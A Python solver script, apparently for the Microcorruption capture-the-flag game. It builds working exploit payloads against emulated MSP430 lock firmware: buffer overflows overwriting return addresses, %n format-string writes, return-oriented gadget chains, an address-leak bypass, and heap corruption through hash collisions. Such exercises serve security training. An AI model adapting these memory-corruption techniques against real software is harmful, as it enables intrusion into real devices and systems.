#!/usr/bin/env python
import binascii
import struct
import string
import random
import pyemu
from uc.uc import uc, get_level_dumpname
from chdrft.utils.string import str_dist
from chdrft.utils.misc import cwdpath, failsafe, JsonUtils, path_from_script
import os
import time
import re


def tsf(x):
    if isinstance(x, str):
        return binascii.hexlify(x.encode()).decode()
    return binascii.hexlify(x).decode()


def sanitize(x):
    if isinstance(x, str):
        return x.encode()
    return x


def solve_santa(data=[]):
    ret_addr = 0x43cc
    want_0 = ret_addr-6-1
    addr_max = ret_addr-0x19
    addr_min = ret_addr-0x18
    start_login = 0x43a2
    start_pwd = 0x43b4

    login = b'a'*(addr_max-start_login)
    login += b'\x05\x7f'
    login += b'a'*(ret_addr-start_login-len(login))
    login += struct.pack('<H', 0x463a)

    pwd = 'a'*(want_0-start_pwd)

    return [login, pwd], True


def solve_jakarta(data=[]):
    want_len = 0x22+2
    target = 0x461c

    login = 'a'*0x20

    pwd = b'a'*(want_len-len(login))
    pwd += struct.pack('<H', target)
    pwd += b'a'*0xe0
    return [login, pwd], True


def solve_addis(data=[]):
    target = 0x3c7a
    buf = struct.pack('<H', target)
    buf += b'%d%n'
    return [buf], True


def solve_montevideo(data=[]):
    target = 3e42
    g_int = 0x4460
    buf = b'a'*0x10
    unlock_int = 0x7f
    buf += struct.pack('<HH', g_int, unlock_int)
    return [buf], True


def solve_novo(data=[]):
    target = 0x44c8
    buf = struct.pack('<H', target)
    buf += b'a'*(0x7f-len(buf))
    buf += b'%n'

    return [buf], True


def solve_algiers(data=[]):
    a1 = 0x240e
    a2 = 0x2424
    target = 0x243a
    sp_ret = 0x4394
    dst = a2+2

    #(0x46a8+6+sz)*2+6=g_unlock
    sz = (dst-6)//2-0x46a8-6

    b1 = b'a'*(a2-6-a1)
    b1 += struct.pack('<HHh', sp_ret-4, sp_ret-4, sz)

    b2 = b'a'*2
    b2 += struct.pack('<HH', 0x12b0, 0x4564)
    # b2=b'a'*(target-4-a2)
    # b2+=struct.pack('<H'
    return [b1, b2], True


def solve_lagos(data=[]):
    buf = b'a'*0x11
    g_read = 0x4654
    read_buf = 0x4344
    read_len = b'AA'
    buf += struct.pack('<H', g_read)
    buf += struct.pack('<H', read_buf)
    buf += read_len

    assert buf.decode().isalnum()

    g_ret = 0x465e
    g_int = 0x4656
    stage2 = struct.pack('<H', g_ret)*100
    stage2 += struct.pack('<H', g_int)
    stage2 += struct.pack('<H', 0x7f)

    return [buf, stage2], True


def solve_vlad(data=[]):
    g_print = 0x476a
    g_unlock = 0x48ec

    b1 = '%x%x'
    if len(data) == 0:
        return [b1], False

    out = data[0]
    m=re.search('>>(\w+)', out)
    assert m
    print(m.group(1))
    out=m.group(1)[4:]
    offset = int(out, 16)
    offset -= g_print
    print('offset >> ', offset)
    g_unlock += offset

    b2 = b'a'*8
    b2 += struct.pack('<HHH', g_unlock, 0xffff, 0x7f)
    return [b2], True


def solve_bangalore(data=[]):
    g_read = 0x4468
    g_markx = 0x44ba
    read_addr = 0x400a
    read_len = 0x1111
    g_ret = 0x44dc

    read_ex = 0x4102
    op_mov_sr = 0x4032
    op_dec_sr = 0x8312

    b = b'a'*0x10
    b += struct.pack('<HHH', g_read, read_addr, read_len)
    b += struct.pack('<HHH', g_markx, read_ex >> 8, 0)

    sled_len = (read_ex-read_addr)//2
    b2 = b''
    b2 += struct.pack('<H', read_ex)*sled_len
    b2 += struct.pack('<HH', op_mov_sr, 0xff01)
    b2 += struct.pack('<H', op_dec_sr)
    b2 += b'\xb0\x12\x10\x00'

    return [b, b2], True


def solve_cherno(data=[]):
    charset = range(ord('a'), ord('z'))

    def hash(x, n):
        mask = 2**n-1
        h = 0
        for i in x:
            h = (h+i)*0x1f
        return h & mask

    def find_h(val, n, seen, start=b''):
        while True:
            rem = 0x15-len(start)

            tmp = bytes([random.choice(charset) for x in range(rem)])
            cnd = start+tmp

            if not cnd in seen and hash(cnd, n) == val:
                seen.append(cnd)
                print('ok >> ', tsf(cnd))
                return cnd

    n = 3
    bs = 5
    ns = 0x12

    def build_reqs(lst):
        buf = b''
        for x in lst:
            buf += b'nnn '+x+b' 1;'
        return buf
    en = 2**n

    seen = []
    rehash_target = en*bs//4+2
    stage0 = [find_h(i % en, n, seen) for i in range(rehash_target)]
    stage0 = build_reqs(stage0)

    stage0_sz = 6*(en+2)+en*ns*bs+2*2*en
    n += 1
    en *= 2

    start_buf = 0x3dec
    num_chars = 400
    # mark used

    chunk_addr = 0x5342
    target_addr = 0x3dce

    want = struct.pack('<HHH', 0x1010, chunk_addr, 0x0111)
    want += struct.pack('<HHH', 0x1010, target_addr, 0x1010)
    stage1=[find_h(en-1, n, seen)]
    stage1.append(find_h(en - 1, n, seen, want))

    stage1.extend(
        [find_h(x, n, seen) for x in range(rehash_target - len(stage1))])

    buf = build_reqs(stage1)
    assert num_chars >= len(buf)

    return [stage0, buf], True

levels = []
levels.append([uc.Levels.SANTA_CRUZ, solve_santa])
levels.append([uc.Levels.JAKARTA, solve_jakarta])
levels.append([uc.Levels.ADDIS_ABABA, solve_addis])
levels.append([uc.Levels.NOVOSIBIRSK, solve_novo])
levels.append([uc.Levels.MONTEVIDEO, solve_montevideo])
levels.append([uc.Levels.ALGIERS, solve_algiers])
levels.append([uc.Levels.LAGOS, solve_lagos])
levels.append([uc.Levels.VLADIVOSTOK, solve_vlad])
levels.append([uc.Levels.BANGALORE, solve_bangalore])
levels.append([uc.Levels.CHERNOBYL, solve_cherno])

mp = {x.value: y for x, y in levels}


def solve(lvl, args):
    if not lvl in mp:
        print('does not contain {}, skipping'.format(lvl))
        return

    func = mp[lvl]
    emu = pyemu.EmuMsp430()

    fil = os.path.join(args.snapshot_dir, get_level_dumpname(lvl))
    with open(fil, 'r') as f:
        content = f.read()

    print('Solving', lvl)
    input('go?')
    emu.load(sanitize(content))
    data = []
    while True:
        res, end = func(data)

        for x in res:
            emu.run()
            assert emu.get_status() == emu.Status_Interrupted
            print('CUR STDOUT >> ', data)
            input('submitting:\n{}\ncontineu?'.format(tsf(x)))
            emu.set_stdin(sanitize(x))

        emu.run()
        out = emu.get_stdout()
        data.append(out)
        if end:
            break

    emu.run()
    print('stdout >> ', data)
    assert emu.get_status() == emu.Status_Off
    assert emu.is_solved()


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--level', type=str)
    parser.add_argument('--all', action='store_true')

    defaultdir = path_from_script(__file__, '../data')
    parser.add_argument('--snapshot-dir', type=cwdpath, default=defaultdir)

    args = parser.parse_args()
    level_list = [x.value for x in list(uc.Levels)]

    if args.all:
        for x in level_list:
            solve(x, args)
    else:
        choice = args.level
        assert choice
        tb = []
        for level in level_list:
            tb.append((str_dist(level, choice, case=False), level))
        tb.sort()
        best, take = tb[0]
        if best == tb[1][0] and best >= len(choice)//2:
            print('could not decide between {} and {}'.format(
                tb[0][1],
                tb[1][1]))
            assert False

        solve(take, args)
